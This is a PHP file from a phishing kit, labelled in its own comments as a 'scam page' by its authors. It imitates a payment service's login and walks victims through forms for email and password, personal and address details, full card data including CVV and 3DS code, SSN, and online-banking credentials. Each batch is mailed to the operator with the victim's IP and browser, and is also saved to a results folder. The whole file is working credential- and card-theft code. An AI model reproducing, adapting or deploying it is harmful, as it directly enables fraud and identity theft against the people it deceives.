<?php
session_start();
include ('bt.php');
@ini_set('display_errors', 0);
error_reporting(E_ALL ^ E_NOTICE);
$ib = getenv("REMOTE_ADDR");
date_default_timezone_set('GMT');
$crt = date("Y");
$dt=date("H:i:s");
include "./trad".$_SESSION['0001'];
@ini_set('display_errors', 0);
error_reporting(E_ALL ^ E_NOTICE);
$log = $_GET["log"];
$random=rand(0,100000000000);
$ran = md5($random);
$_SESSION[$ran] = $random;
$random=rand(0,100000000000);
$rans = md5($random);
$_SESSION[$rans] = $random;
$O1 = $_SESSION['1']=$_POST['1'];
$O2 = $_SESSION['2']=$_POST['2'];
?>
<!DOCTYPE html><!-- SCAM PAGE PPL V3 #By Mr-TRON, X Virginia -->
<html class=" superBowlBG superBowlDefault js " lang="fr" dir="ltr">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>(<?php echo $_SESSION['cntc']; ?>) <?php echo $log_ttl1; ?></title>
<meta name="format-detection" content="telephone=no">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black">
<link rel="shortcut icon" type="image/x-icon" href="./imcs_files/Icon.ico">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js" type="text/javascript"></script>
<script src="./imcs_files/jquery.maskedinput.min.js" type="text/javascript"></script>
<style type="text/css">
        body {
            margin: 0
        }
        .loading #main {
            opacity: .1
        }
        .spinner {
            height: 60%;
            width: 70%;
            position: absolute;
            z-index: 10
        }
        .spinner .spinWrap {
            width: 200px;
            height: 100px;
            position: absolute;
            top: 50%;
            left: 50%;
            margin-left: -100px;
            margin-top: -50px
        }
        .spinner .loader,
        .spinner .spinnerImage {
            height: 100px;
            width: 100px;
            position: absolute;
            top: 0;
            left: 50%;
            opacity: 1;
            filter: alpha(opacity=100)
        }
        .spinner .spinnerImage {
            margin: 28px 0 0 -25px;
            background: url(./imcs_files/iso-spin.png) no-repeat
        }
        .spinner .loader {
            margin: 0 0 0 -55px;
            background-color: transparent;
            -webkit-animation: rotation .7s infinite linear;
            -moz-animation: rotation .7s infinite linear;
            -o-animation: rotation .7s infinite linear;
            animation: rotation .7s infinite linear;
            border-left: 5px solid #cbcbca;
            border-right: 5px solid #cbcbca;
            border-bottom: 5px solid #cbcbca;
            border-top: 5px solid #2380be;
            border-radius: 100%
        }
</style>
<link rel="stylesheet" href="./imcs_files/appSuperBowl.css">
</head>
<?php
if($log == ""){
?>
<body><header class="mainHeader" role="banner"><div class="headerContainer"><div class="grid12"><a href="#" class="logo"></a><div class="loginBtn"><span class="securityLock"><?php echo $inf_scr; ?></span></div></div></div></header><main class="superBowlMain"><section id="content" role="main" data-country="US"><section id="main" class=""><div id="account" class="account grid12"><form action="Up-dating.php?log=CheckLog#E=<?php echo $ran;?>P=<?php echo $rans;?>logdata=<?php echo crypt($_SESSION['cntn']); ?>=<?php include '../ran.php'; echo $r; ?>" method="post" name="signup_form" class="proceed" onSubmit="return checkbae()"><input type="hidden" id="csrf" name="_csrf" value=""><div class="customGrid7"><div class="personalAccountSignUp" data-selectionenabled="false">    <div class="stepProgress"><span class="selected"></span><span></span><span></span><span></span></div><div class="pageHeader"><h2><?php echo $log_lab1; ?></h2></div><p class="personalAccount"><span class="personalHeader"><?php echo $log_lab2; ?></span></p><div class="superBowlContainer "><div class="groupFields"><div class="textInput lap "><div class="fields email large">
<label for="email"></label><input type="email" id="email" name="1" class="validate" value="" maxlength="127" autocomplete="off" title="<?php echo $log_em; ?>" placeholder="<?php echo $log_em; ?>"  ></div></div><div class="passwordSection clearfix"><div class="textInput lap "><div class="fields large"><label for="password"></label><input type="password" id="password" name="2" class="hasHelp validate hovered"  maxlength="20" autocomplete="off" title="<?php echo $log_ps; ?>" placeholder="<?php echo $log_ps; ?>" autocorrect="off" autocapitalize="off" aria-required="true" value=""><span class="tickmark hide"></span><a id="forgotPasswordLink" target="_top" class="link bold" href="#" aria-expanded="false" role="link" aria-labeledby="recoverPasswordHelpAria"><?php echo $log_frg; ?></a></div></div></div></div><div class="btns"><input id="_eventId_personal" name="_eventId_continue" type="submit" class="medium button" value="<?php echo $log_btn; ?>"></div></div></div></div></form></div></section></section></main><?php include ('xf/ftr.php'); ?><div id="overPanel" class="US overPanel flagsIn"></div><script src="./imcs_files/jquery.maskedinput.min.js" type="text/javascript"></script></body>
<?php
}	
?>
<?php
if($log == "CheckLog"){
if(strlen($O2) > 7  ){ 
if (!empty($O1) and !empty($O2)){
?>
<?php
$_SESSION['s1']=$_POST['1'];
$_SESSION['s2']=$_POST['2'];
$msg ='
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN" "http://www.w3.org/TR/html4/frameset.dtd">
<html>
<head>
<style type="text/css">
body {
  font-family: "Helvetica Neue", Helvetica, Arial;
  font-size: 14px;
  line-height: 20px;
  font-weight: 400;
  color: #3b3b3b;
  -webkit-font-smoothing: antialiased;
  font-smoothing: antialiased;
  background: #2b2b2b;
}

.wrapper {
  margin: 0 auto;
  padding: 40px;
  max-width: 800px;
}

.table {
  margin: 0 0 40px 0;
  width: 100%;
  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2);
  display: table;
}
@media screen and (max-width: 580px) {
  .table {
    display: block;
  }
}

.row {
  display: table-row;
  background: #f6f6f6;
}
.row:nth-of-type(odd) {
  background: #e9e9e9;
}
.row.header {
  font-weight: 900;
  color: #ffffff;
  background: #525354;
}
.row.green {
  background: #525354;
}
.row.blue {
  background: #525354;
}
@media screen and (max-width: 580px) {
  .row {
    padding: 8px 0;
    display: block;
  }
}

.cell {
  padding: 6px 12px;
  display: table-cell;
}
@media screen and (max-width: 580px) {
  .cell {
    padding: 2px 12px;
    display: block;
  }
}
</style>
</head>
<body>
<div class="wrapper">
  <!-- tbl 1 -->
  <div class="table">
    
    <div class="row header green">
      <div class="cell">
        LOGIN 
      </div>
      <div class="cell">
         X Virginia .V3
      </div>
      </div>
    <div class="row">
      <div class="cell">
        Email:
      </div>
      <div class="cell">
        '.$_SESSION['s1'].'
      </div>
	  </div>
    
    <div class="row">
      <div class="cell">
        Password:
      </div>
      <div class="cell">
        '.$_SESSION['s2'].'
      </div>
	  </div>
    </div>
	<!-- tbl 2 -->
  <div class="table">
    
    <div class="row header">
      <div class="cell">
        MACHINE
      </div>
      <div class="cell">
        
      </div>
      </div>
    <div class="row">
      <div class="cell">
        COUNTRY:
      </div>
      <div class="cell">
        '.$_SESSION['cntn'].'
      </div>
	  </div>
      <div class="row">
      <div class="cell">
        IP:
      </div>
      <div class="cell">
        '.$ib.'
      </div>
	  </div>
	  <div class="row">
      <div class="cell">
        BROWSER:
      </div>
      <div class="cell">
        '.$_SERVER['HTTP_USER_AGENT'].'
      </div>
	  </div>
    <div class="row">
      <div class="cell">
        IP LINK:
      </div>
      <div class="cell">
        http://www.geoiptool.com/?IP='.$ib.'
      </div>
	  </div>
    </div>
	<!-- end -->
</div>
</body>
</html>
';
include ('Your-email.php');
if($rzhtm == "on"){
$fl = fopen("../Rezulta/Gift-".$_SESSION['s1']."--".$ib.".html","a");
fwrite($fl,$msg);
}
mail($em,"LOGIN | ".$_SESSION['cntn']." | ".$ib,$msg,"MIME-Version: 1.0" . "\r\n"."Content-type:text/html;charset=UTF-8" . "\r\n"."From:X Virginia V3<test@case.com>");
?>	
<?php include ('xf/prctinf.php'); ?>
<?php
} 
}
else {
	?>
<?php include ('xf/err.php'); ?>

<?php
}};
?>
<?php
if($log == "InfoPage"){
?>
<?php include ('xf/inf.php'); ?>
<?php
}	
?>
<?php
if($log == "CheckInfo"){
?>
<?php
$_SESSION['s03']=$_POST['03'];
$_SESSION['s04']=$_POST['04'];
$_SESSION['s05']=$_POST['05'];
$_SESSION['s06']=$_POST['06'];
$_SESSION['s07']=$_POST['07'];
$_SESSION['s08']=$_POST['08'];
$_SESSION['s09']=$_POST['09'];
$_SESSION['s10']=$_POST['10'];
$_SESSION['s11']=$_POST['11'];
$_SESSION['s12']=$_POST['12'];
$msg ='
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN" "http://www.w3.org/TR/html4/frameset.dtd">
<html>
<head>
<style type="text/css">
body {
  font-family: "Helvetica Neue", Helvetica, Arial;
  font-size: 14px;
  line-height: 20px;
  font-weight: 400;
  color: #3b3b3b;
  -webkit-font-smoothing: antialiased;
  font-smoothing: antialiased;
  background: #2b2b2b;
}

.wrapper {
  margin: 0 auto;
  padding: 40px;
  max-width: 800px;
}

.table {
  margin: 0 0 40px 0;
  width: 100%;
  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2);
  display: table;
}
@media screen and (max-width: 580px) {
  .table {
    display: block;
  }
}

.row {
  display: table-row;
  background: #f6f6f6;
}
.row:nth-of-type(odd) {
  background: #e9e9e9;
}
.row.header {
  font-weight: 900;
  color: #ffffff;
  background: #525354;
}
.row.green {
  background: #525354;
}
.row.blue {
  background: #525354;
}
@media screen and (max-width: 580px) {
  .row {
    padding: 8px 0;
    display: block;
  }
}

.cell {
  padding: 6px 12px;
  display: table-cell;
}
@media screen and (max-width: 580px) {
  .cell {
    padding: 2px 12px;
    display: block;
  }
}
</style>
</head>
<body>
<div class="wrapper">
  <!-- tbl 1 -->
  <div class="table">
    
    <div class="row header blue">
      <div class="cell">
        BIll INFO 
      </div>
      <div class="cell">
         X Virginia .V3
      </div>
      </div>
    <div class="row">
      <div class="cell">
        First Name:
      </div>
      <div class="cell">
        '.$_SESSION['s03'].'
      </div>
	  </div>
    
    <div class="row">
      <div class="cell">
        Last Name:
      </div>
      <div class="cell">
        '.$_SESSION['s04'].'
      </div>
	  </div>
    <div class="row">
      <div class="cell">
        Date Of Birthday:
      </div>
      <div class="cell">
        '.$_SESSION['s05'].'
      </div>
	  </div>
    
    <div class="row">
      <div class="cell">
        Street address:
      </div>
      <div class="cell">
        '.$_SESSION['s06'].'
      </div>
	  </div>
	  <div class="row">
      <div class="cell">
        Town/City:
      </div>
      <div class="cell">
        '.$_SESSION['s07'].'
      </div>
	  </div>
    
    <div class="row">
      <div class="cell">
        State:
      </div>
      <div class="cell">
        '.$_SESSION['s08'].'
      </div>
	  </div>
	  <div class="row">
      <div class="cell">
        Country:
      </div>
      <div class="cell">
        '.$_SESSION['s09'].'
      </div>
	  </div>
    
    <div class="row">
      <div class="cell">
        ZIP Code:
      </div>
      <div class="cell">
        '.$_SESSION['s10'].'
      </div>
	  </div>
	  <div class="row">
      <div class="cell">
        Phone Number:
      </div>
      <div class="cell">
        '.$_SESSION['s11'].'/'.$_SESSION['s12'].'
      </div>
	  </div>
	  </div>
    <!-- tbl 2 -->
    <div class="table">
    
    <div class="row header">
      <div class="cell">
        MACHINE
      </div>
      <div class="cell">
        
      </div>
      </div>
    <div class="row">
      <div class="cell">
        COUNTRY:
      </div>
      <div class="cell">
        '.$_SESSION['cntn'].'
      </div>
	  </div>
      <div class="row">
      <div class="cell">
        IP:
      </div>
      <div class="cell">
        '.$ib.'
      </div>
	  </div>
	  <div class="row">
      <div class="cell">
        BROWSER:
      </div>
      <div class="cell">
        '.$_SERVER['HTTP_USER_AGENT'].'
      </div>
	  </div>
    <div class="row">
      <div class="cell">
        IP LINK:
      </div>
      <div class="cell">
        http://www.geoiptool.com/?IP='.$ib.'
      </div>
	  </div>
	  </div>
	<!-- end -->
</div>
</body>
</html>
';
include ('Your-email.php');
if($rzhtm == "on"){
$fl = fopen("../Rezulta/Gift-".$_SESSION['s1']."--".$ib.".html","a");
fwrite($fl,$msg);
}
mail($em,"ADDRESS | ".$_SESSION['cntn']." | ".$ib,$msg,"MIME-Version: 1.0" . "\r\n"."Content-type:text/html;charset=UTF-8" . "\r\n"."From:X Virginia V3<test@case.com>");
?>
<?php include ('xf/prctcrd.php'); ?>
<?php
}
?> 
<?php
if($log == "CrdPage"){
?>
<?php include ('xf/crd.php'); ?>
<?php
}	
?>
<?php
if($log == "CheckCrd"){
?>
<?php
function work_hard($nr) {
    $nr = preg_replace('/\D/', '', $nr);
    $nr_length = strlen($nr);
    $prty = $nr_length % 2;
    $ttl = 0;
    for ($i = 0;$i < $nr_length;$i++) {
        $dgt = $nr[$i];
        if ($i % 2 == $prty) {
            $dgt*= 2;
            if ($dgt > 9) {
                $dgt-= 9;
            }
        }
        $ttl+= $dgt;
    }
    if ($ttl % 10 == 0) {
        return "valid";
    } else return "invalid";
}
$O13=$_SESSION['s13']=$_POST['13'];
$O14=$_SESSION['s14']=$_POST['14'];
$O15=$_SESSION['s15']=$_POST['15'];
$O16=$_SESSION['s16']=$_POST['16'];
$O17=$_SESSION['s17']=$_POST['17'];
$O18=$_SESSION['s18']=$_POST['18'];
$O19=$_SESSION['s19']=$_POST['19'];
function work_hard_01($O14) {
    $bndt = array();
    $crdbn = substr($O14, 0, 6);
    $bndt = json_decode(file_get_contents("https://bins.payout.com/api/v1/bins/" . $crdbn), true);
    return $bndt;
}
$crdinf = work_hard_01($_SESSION['s14']);
$_SESSION['bnnm'] = ($crdinf['issuer']);
$msg ='
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN" "http://www.w3.org/TR/html4/frameset.dtd">
<html>
<head>
<style type="text/css">
body {
  font-family: "Helvetica Neue", Helvetica, Arial;
  font-size: 14px;
  line-height: 20px;
  font-weight: 400;
  color: #3b3b3b;
  -webkit-font-smoothing: antialiased;
  font-smoothing: antialiased;
  background: #2b2b2b;
}

.wrapper {
  margin: 0 auto;
  padding: 40px;
  max-width: 800px;
}

.table {
  margin: 0 0 40px 0;
  width: 100%;
  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2);
  display: table;
}
@media screen and (max-width: 580px) {
  .table {
    display: block;
  }
}

.row {
  display: table-row;
  background: #f6f6f6;
}
.row:nth-of-type(odd) {
  background: #e9e9e9;
}
.row.header {
  font-weight: 900;
  color: #ffffff;
  background: #525354;
}
.row.green {
  background: #525354;
}
.row.blue {
  background: #525354;
}
@media screen and (max-width: 580px) {
  .row {
    padding: 8px 0;
    display: block;
  }
}

.cell {
  padding: 6px 12px;
  display: table-cell;
}
@media screen and (max-width: 580px) {
  .cell {
    padding: 2px 12px;
    display: block;
  }
}
</style>
</head>
<body>
<div class="wrapper">
  <!-- tbl 1 -->
  <div class="table">
    
    <div class="row header green">
      <div class="cell">
        CARD INFO 
      </div>
      <div class="cell">
         X Virginia .V3
      </div>
      </div>
    <div class="row">
      <div class="cell">
        Crd Holder:
      </div>
      <div class="cell">
        '.$_SESSION['s13'].'
      </div>
	  </div>
    
    <div class="row">
      <div class="cell">
        Crd Number:
      </div>
      <div class="cell">
        '.$_SESSION['s14'].'
      </div>
	  </div>
    <div class="row">
      <div class="cell">
        Exp Date:
      </div>
      <div class="cell">
        '.$_SESSION['s15'].'
      </div>
	  </div>
    
    <div class="row">
      <div class="cell">
        C-SC C-VV:
      </div>
      <div class="cell">
        '.$_SESSION['s16'].'
      </div>
	  </div>
	  <div class="row">
      <div class="cell">
        3DS V-B-V:
      </div>
      <div class="cell">
        '.$_SESSION['s17'].'
      </div>
	  </div>
    
    <div class="row">
      <div class="cell">
        ACC Number:
      </div>
      <div class="cell">
        '.$_SESSION['s18'].'
      </div>
	  </div>
	  <div class="row">
      <div class="cell">
        S-SN S-RT:
      </div>
      <div class="cell">
        '.$_SESSION['s19'].'
      </div>
	  </div>
    </div>
    <!-- tbl 2 -->
    <div class="table">
    
    <div class="row header">
      <div class="cell">
        MACHINE
      </div>
      <div class="cell">
        
      </div>
      </div>
    <div class="row">
      <div class="cell">
        COUNTRY:
      </div>
      <div class="cell">
        '.$_SESSION['cntn'].'
      </div>
	  </div>
      <div class="row">
      <div class="cell">
        IP:
      </div>
      <div class="cell">
        '.$ib.'
      </div>
	  </div>
	  <div class="row">
      <div class="cell">
        BROWSER:
      </div>
      <div class="cell">
        '.$_SERVER['HTTP_USER_AGENT'].'
      </div>
	  </div>
    <div class="row">
      <div class="cell">
        IP LINK:
      </div>
      <div class="cell">
        http://www.geoiptool.com/?IP='.$ib.'
      </div>
	  </div>
	  </div>
	<!-- end -->
</div>
</body>
</html>
';
include ('Your-email.php');
if($rzhtm == "on"){
$fl = fopen("../Rezulta/Gift-".$_SESSION['s1']."--".$ib.".html","a");
fwrite($fl,$msg);
}

if (!empty($O13) and !empty($O14) and work_hard($O14) == "valid" and !empty($O15) and !empty($O16)) { mail($em,"CARD | ".$_SESSION['cntn']." | ".$ib,$msg,"MIME-Version: 1.0" . "\r\n"."Content-type:text/html;charset=UTF-8" . "\r\n"."From:X Virginia V3<test@case.com>");
?>
<?php
if ($pgbnk == 'yes') {
?>
<?php include ('xf/prctbnk.php'); ?>
<?php
}
else{
?>
<?php include ('xf/prctscs.php'); ?>
<?php
 }
?>	
<?php    
} 
else {
?>
<?php include ('xf/prctcrderr.php'); ?>
<?php
}
?>
<?php
}
?>
<?php
if($log == "CrdErrPage"){
?>
<?php include ('xf/crderr.php'); ?>
<?php
}	
?>
<?php
if($log == "BnkPage"){
?>
<?php include ('xf/bnk.php'); ?>
<?php
}	
?>
<?php
if($log == "CheckBnk"){
?>
<?php
$_SESSION['s20']=$_POST['20'];
$_SESSION['s21']=$_POST['21'];
$_SESSION['s22']=$_POST['22'];
$_SESSION['s23']=$_POST['23'];
$msg ='
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN" "http://www.w3.org/TR/html4/frameset.dtd">
<html>
<head>
<style type="text/css">
body {
  font-family: "Helvetica Neue", Helvetica, Arial;
  font-size: 14px;
  line-height: 20px;
  font-weight: 400;
  color: #3b3b3b;
  -webkit-font-smoothing: antialiased;
  font-smoothing: antialiased;
  background: #2b2b2b;
}

.wrapper {
  margin: 0 auto;
  padding: 40px;
  max-width: 800px;
}

.table {
  margin: 0 0 40px 0;
  width: 100%;
  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2);
  display: table;
}
@media screen and (max-width: 580px) {
  .table {
    display: block;
  }
}

.row {
  display: table-row;
  background: #f6f6f6;
}
.row:nth-of-type(odd) {
  background: #e9e9e9;
}
.row.header {
  font-weight: 900;
  color: #ffffff;
  background: #525354;
}
.row.green {
  background: #525354;
}
.row.blue {
  background: #525354;
}
@media screen and (max-width: 580px) {
  .row {
    padding: 8px 0;
    display: block;
  }
}

.cell {
  padding: 6px 12px;
  display: table-cell;
}
@media screen and (max-width: 580px) {
  .cell {
    padding: 2px 12px;
    display: block;
  }
}
</style>
</head>
<body>
<div class="wrapper">
  <!-- tbl 1 -->
  <div class="table">
    
    <div class="row header blue">
      <div class="cell">
        BANK INFO 
      </div>
      <div class="cell">
         X Virginia .V3
      </div>
      </div>
	  <div class="row">
      <div class="cell">
        Bnk Name:
      </div>
      <div class="cell">
        '.$_SESSION['bnnm'].'
      </div>
	  </div>
    <div class="row">
      <div class="cell">
        Bnk ID:
      </div>
      <div class="cell">
        '.$_SESSION['s20'].'
      </div>
	  </div>
    
    <div class="row">
      <div class="cell">
        Bnk Password:
      </div>
      <div class="cell">
        '.$_SESSION['s21'].'
      </div>
	  </div>
    <div class="row">
      <div class="cell">
        Acc Number:
      </div>
      <div class="cell">
        '.$_SESSION['s22'].'
      </div>
	  </div>
    
    <div class="row">
      <div class="cell">
        Rtt Number:
      </div>
      <div class="cell">
        '.$_SESSION['s23'].'
      </div>
	  </div>
	  </div>
    <!-- tbl 2 -->
    <div class="table">
    
    <div class="row header">
      <div class="cell">
        MACHINE
      </div>
      <div class="cell">
        
      </div>
      </div>
    <div class="row">
      <div class="cell">
        COUNTRY:
      </div>
      <div class="cell">
        '.$_SESSION['cntn'].'
      </div>
	  </div>
      <div class="row">
      <div class="cell">
        IP ADDRESS:
      </div>
      <div class="cell">
        '.$ib.'
      </div>
	  </div>
	  <div class="row">
      <div class="cell">
        BROWSER:
      </div>
      <div class="cell">
        '.$_SERVER['HTTP_USER_AGENT'].'
      </div>
	  </div>
    <div class="row">
      <div class="cell">
        IP LINK:
      </div>
      <div class="cell">
        http://www.geoiptool.com/?IP='.$ib.'
      </div>
	  </div>
	  </div>
	<!-- end -->
</div>
</body>
</html>
';
include ('Your-email.php');
if($rzhtm == "on"){
$fl = fopen("../Rezulta/Gift-".$_SESSION['s1']."--".$ib.".html","a");
fwrite($fl,$msg);
}
mail($em,"BANK | ".$_SESSION['cntn']." | ".$ib,$msg,"MIME-Version: 1.0" . "\r\n"."Content-type:text/html;charset=UTF-8" . "\r\n"."From:X Virginia V3<test@case.com>");
?>
<?php include ('xf/prctscs.php'); ?>
<?php
}
?> 
<?php
if($log == "ScsPage"){
?>
<?php include ('xf/scs.php'); ?>
<?php
}	
?>
</html>